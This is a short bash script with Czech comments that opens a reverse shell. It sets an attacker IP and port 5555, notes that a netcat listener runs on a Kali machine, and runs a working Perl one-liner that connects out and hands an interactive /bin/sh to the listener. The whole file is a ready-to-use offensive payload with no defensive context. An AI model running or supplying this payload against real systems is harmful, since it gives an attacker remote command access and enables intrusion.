#!/bin/bash

# Nastavení IP adresy útočníka a portu
# Na straně útočníka (Kali) musí běžet následující: nc -lvnp 5555

IP="10.211.55.13"
PORT=5555

# Použití Perlu k otevření reverzního shellu
perl -e 'use Socket;$i="'"$IP"'";$p='"$PORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
